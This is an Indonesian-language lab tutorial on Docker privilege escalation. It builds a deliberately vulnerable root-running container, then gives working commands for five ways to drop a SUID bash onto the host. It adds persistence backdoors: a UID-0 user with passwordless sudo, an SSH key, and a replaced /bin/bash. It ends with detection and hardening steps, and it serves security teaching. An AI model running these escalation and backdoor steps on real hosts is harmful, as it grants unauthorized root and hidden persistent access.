
## 🔰 STEP 1: Setup Environment Awal

### 1.1 Login sebagai Root (Setup Awal)
```bash
sudo su -
```

### 1.2 Create Users
```bash
# Create admin user
useradd -m -s /bin/bash admin
echo "admin:Admin123" | chpasswd
usermod -aG sudo admin

# Create developer user  
useradd -m -s /bin/bash developer
echo "developer:Dev123" | chpasswd

# Verify
id admin
id developer
```

### 1.3 Install Docker
```bash
apt update
apt install -y docker.io
systemctl enable docker
systemctl start docker

# Verify
docker --version
```

### 1.4 Berikan Akses Docker ke Developer
```bash
usermod -aG docker developer
```

---

## 📦 STEP 2: Setup Aplikasi Production

### 2.1 Login sebagai Admin
```bash
su - admin
```

### 2.2 Create Project Directory
```bash
mkdir -p ~/production-app
cd ~/production-app
```

### 2.3 Create Dockerfile
```bash
cat > Dockerfile << 'EOF'
FROM ubuntu:22.04

RUN apt update && apt install -y \
    python3 \
    python3-pip \
    nginx \
    && rm -rf /var/lib/apt/lists/*

RUN pip3 install flask gunicorn

WORKDIR /app
COPY app.py .
COPY requirements.txt .

# CRITICAL VULNERABILITY: Run as root
CMD ["gunicorn", "-b", "0.0.0.0:5000", "app:app"]
EOF
```

### 2.4 Create Application Files
```bash
# app.py
cat > app.py << 'EOF'
from flask import Flask, jsonify
app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <h1>Production System - Perusahaan XYZ</h1>
    <p>Employee Management Portal</p>
    <div>
        <a href="/employees">Data Karyawan</a> | 
        <a href="/payroll">Penggajian</a> |
        <a href="/reports">Laporan</a>
    </div>
    '''

@app.route('/employees')
def employees():
    return jsonify({"status": "success", "data": "Employee database"})

@app.route('/payroll')
def payroll():
    return jsonify({"status": "success", "data": "Payroll system"})

@app.route('/reports')
def reports():
    return jsonify({"status": "success", "data": "Financial reports"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
EOF

# requirements.txt
cat > requirements.txt << 'EOF'
flask
gunicorn
EOF
```

### 2.5 Build Docker Image
```bash
docker build -t production-app .
docker images
```

---

## 🚀 STEP 3: Deploy Application

### 3.1 Run Production Container
```bash
docker run -d --name prod-system -p 8080:5000 production-app
```

### 3.2 Verify Deployment
```bash
docker ps
curl http://localhost:8080
```

**Expected Output:**
```html
<h1>Production System - Perusahaan XYZ</h1>
<p>Employee Management Portal</p>
...
```

---

## 🎭 STEP 4: Attacker (Developer) Access

### 4.1 Login sebagai Developer
```bash
su - developer
whoami
# developer
```

### 4.2 Verify Docker Access
```bash
docker ps
id
```
**Output:**
```
uid=1002(developer) gid=1002(developer) groups=1002(developer),999(docker)
```

---

## 💥 STEP 5: Privilege Escalation - Export /bin/bash

### 5.1 Technique 1: Direct Volume Mount Attack

#### 5.1.1 Masuk ke Docker Container
```bash
docker run -it --rm -v /tmp:/mnt/host-tmp production-app /bin/bash
```

#### 5.1.2 Di Dalam Container - Ekspor /bin/bash
```bash
# Sekarang di dalam container sebagai root!
whoami
# root

# Ekspor binary bash ke host
cp /bin/bash /mnt/host-tmp/.system-bash

# Berikan SUID permissions
chmod 4755 /mnt/host-tmp/.system-bash

# Verify export berhasil
ls -la /mnt/host-tmp/.system-bash
```
**Output:**
```
-rwsr-xr-x 1 root root 1.2M Dec 10 17:00 /mnt/host-tmp/.system-bash
```

#### 5.1.3 Keluar dari Container
```bash
exit
```

#### 5.1.4 Execute di Host System
```bash
# Kembali ke shell developer di host
whoami
# developer

# Execute the SUID bash
/tmp/.system-bash -p

# Verify privilege escalation
whoami
# root 🎉

id
# uid=1002(developer) gid=1002(developer) euid=0(root)
```

### 5.2 Technique 2: Docker Cp Command

#### 5.2.1 Create Temporary Container
```bash
docker run -d --name temp-container production-app sleep 3600
```

#### 5.2.2 Copy /bin/bash dari Container
```bash
docker cp temp-container:/bin/bash /tmp/.docker-cp-bash
```

#### 5.2.3 Set SUID Permissions
```bash
# Butuh akses root untuk set SUID, jadi kita buat container untuk set permissions
docker run --rm -v /tmp:/mnt production-app chmod 4755 /mnt/.docker-cp-bash

# Verify
ls -la /tmp/.docker-cp-bash
```

#### 5.2.4 Execute dan Cleanup
```bash
/tmp/.docker-cp-bash -p
whoami
# root

# Cleanup
docker rm -f temp-container
```

### 5.3 Technique 3: Shared Directory Attack

#### 5.3.1 Setup Shared Directory
```bash
# Sebagai developer di host
mkdir ~/shared
docker run -it --rm -v /home/developer/shared:/app/shared production-app /bin/bash
```

#### 5.3.2 Di Dalam Container
```bash
# Export bash ke shared directory
cp /bin/bash /app/shared/.shared-bash
chmod 4755 /app/shared/.shared-bash
exit
```

#### 5.3.3 Execute dari Host
```bash
~/shared/.shared-bash -p
whoami
# root
```

---

## 🔧 STEP 6: Advanced Export Techniques

### 6.1 Technique 4: Web Server Export

#### 6.1.1 Start Web Server dalam Container
```bash
docker run -d --name web-export -p 9090:8000 production-app /bin/bash -c "
    cd /tmp
    cp /bin/bash .
    python3 -m http.server 8000
"
```

#### 6.1.2 Download dari Host
```bash
wget -O /tmp/.web-bash http://localhost:9090/bash

# Set permissions via docker
docker run --rm -v /tmp:/mnt production-app chmod 4755 /mnt/.web-bash

# Execute
/tmp/.web-bash -p
```

### 6.2 Technique 5: Base64 Encoding Export

#### 6.2.1 Encode di Container
```bash
docker run --rm production-app /bin/bash -c "
    base64 -w 0 /bin/bash
" > /tmp/bash64.txt
```

#### 6.2.2 Decode di Host
```bash
cat /tmp/bash64.txt | base64 -d > /tmp/.b64-bash

# Set permissions
docker run --rm -v /tmp:/mnt production-app chmod 4755 /mnt/.b64-bash

# Execute
/tmp/.b64-bash -p
```

---

## 🛡️ STEP 7: Persistence & Post-Exploitation

### 7.1 Create Backdoor User
```bash
# Sekarang sebagai root dari privilege escalation
useradd -m -s /bin/bash -u 0 -o -g 0 sysadmin
echo "sysadmin:P@ssw0rd123" | chpasswd

# Tambahkan ke sudoers
echo "sysadmin ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```

### 7.2 Install SSH Backdoor
```bash
# Generate SSH key
ssh-keygen -t rsa -b 4096 -f /root/.ssh/backdoor_key -N ""

# Authorize key
cat /root/.ssh/backdoor_key.pub >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

### 7.3 Create Cronjob Persistence
```bash
# Backup original bash
cp /bin/bash /bin/.bash-backup

# Replace with our SUID bash
cp /tmp/.system-bash /bin/bash
chmod 4755 /bin/bash
```

---

## 🔍 STEP 8: Detection & Forensics

### 8.1 Monitor sebagai Admin
```bash
# Login sebagai admin
su - admin

# Check suspicious SUID files
find / -perm -4000 -type f 2>/dev/null | grep -E "(bash|\.bash)"

# Check docker containers
docker ps -a
docker logs prod-system

# Monitor processes
ps aux | grep -E "(\-p|bash.*\-p)"

# Check user accounts
cat /etc/passwd | grep -E "(:0:)|(sysadmin)"
```

### 8.2 Check File Integrity
```bash
# Verify bash binary
ls -la /bin/bash
md5sum /bin/bash
md5sum /bin/dash

# Check /tmp directory
ls -la /tmp/ | grep bash
```

---

## 🧹 STEP 9: Cleanup & Hardening

### 9.1 Remove Backdoors
```bash
# Hapus SUID bash files
rm -f /tmp/.*-bash
rm -f /home/developer/shared/.*-bash

# Hapus backdoor user
userdel -r sysadmin
sed -i '/sysadmin/d' /etc/sudoers

# Restore original bash
cp /bin/.bash-backup /bin/bash
chmod 755 /bin/bash
```

### 9.2 Revoke Docker Access
```bash
gpasswd -d developer docker
```

### 9.3 Implement Docker Security
```bash
# Secure docker daemon
cat > /etc/docker/daemon.json << 'EOF'
{
  "userns-remap": "default",
  "no-new-privileges": true,
  "default-ulimits": {
    "nofile": {
      "Name": "nofile",
      "Hard": 65536,
      "Soft": 65536
    }
  }
}
EOF

systemctl restart docker
```

### 9.4 Secure Dockerfile
```dockerfile
FROM ubuntu:22.04

RUN apt update && apt install -y \
    python3 \
    python3-pip \
    && rm -rf /var/lib/apt/lists/*

RUN groupadd -r appuser && useradd -r -g appuser appuser

WORKDIR /app
COPY --chown=appuser:appuser app.py requirements.txt .

USER appuser

CMD ["gunicorn", "-b", "0.0.0.0:5000", "app:app"]
```

---

## 📝 Summary Key Points

### ✅ Attack Vectors:
1. **Volume Mount** → Export langsung /bin/bash
2. **Docker Cp** → Copy binary dari container
3. **Shared Directories** → Persistent access
4. **Web Server** → Network transfer
5. **Base64** → Stealth text transfer

### 🔐 Prevention:
- Jangan berikan docker access ke non-admin
- Gunakan non-root user di Dockerfile
- Hindari volume mounts ke sensitive directories
- Implement user namespace remapping
- Monitor SUID files regularly

### 🎯 Lesson Learned:
Privilege escalation melalui Docker sangat mungkin dengan export /bin/bash dari container root ke host system. Security hardening yang tepat sangat critical di production environment.

**⚠️ Remember:** Tutorial ini untuk edukasi keamanan di lingkungan lab yang terkontrol!
